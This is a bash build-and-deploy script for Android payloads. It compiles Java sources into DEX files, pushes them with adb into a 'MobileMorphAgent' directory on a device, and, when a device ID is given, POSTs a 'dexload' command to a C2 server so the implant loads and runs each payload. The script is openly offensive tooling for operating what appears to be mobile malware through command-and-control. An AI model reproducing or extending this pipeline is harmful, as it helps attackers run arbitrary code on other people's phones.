#!/bin/bash

# === CONFIG ===
SRC_DIR="payloads_source/com/payload"
CLASS_DIR="out"
DEX_OUT="payloads_dex"
DEX_DEST="payloads"
ANDROID_JAR="$ANDROID_HOME/platforms/android-33/android.jar"
C2_URL="http://localhost:5000"

# === ARGS ===
DEVICE_ID="$1"  # Optional

# === CHECKS ===
if [ ! -d "$SRC_DIR" ]; then
    echo "[!] Source dir not found: $SRC_DIR"
    exit 1
fi

if [ ! -f "$ANDROID_JAR" ]; then
    echo "[!] Android jar not found at: $ANDROID_JAR"
    echo "    Please check your \$ANDROID_HOME"
    exit 1
fi

mkdir -p $CLASS_DIR $DEX_OUT $DEX_DEST

# === BUILD LOOP ===
for JAVA_FILE in $SRC_DIR/*.java; do
    NAME=$(basename "$JAVA_FILE" .java)
    echo "[+] Compiling $NAME..."

    rm -rf $CLASS_DIR $DEX_OUT
    mkdir -p $CLASS_DIR $DEX_OUT

    javac -classpath "$ANDROID_JAR" -d "$CLASS_DIR" "$JAVA_FILE"
    if [ $? -ne 0 ]; then
        echo "[!] Compilation failed for $NAME"
        continue
    fi

    d8 --output="$DEX_OUT" "$CLASS_DIR"
    if [ $? -ne 0 ]; then
        echo "[!] DEX conversion failed for $NAME"
        continue
    fi

    DEX_FILE="$DEX_DEST/${NAME}.dex"
    mv "$DEX_OUT/classes.dex" "$DEX_FILE"

    echo "[+] Pushing $NAME.dex to device..."
    adb push "$DEX_FILE" /sdcard/MobileMorphAgent/payloads/

    # === Optional C2 Trigger ===
    if [ -n "$DEVICE_ID" ]; then
        echo "[+] Triggering C2 dexload for $NAME..."
        curl -s -X POST "$C2_URL/set_command" \
            -H "Content-Type: application/json" \
            -d "{\"device_id\": \"$DEVICE_ID\", \"command\": {\"type\": \"dexload\", \"payload\": \"/sdcard/MobileMorphAgent/payloads/${NAME}.dex\"}}"
        echo ""
    fi
done

echo "[✓] Done building all payloads."
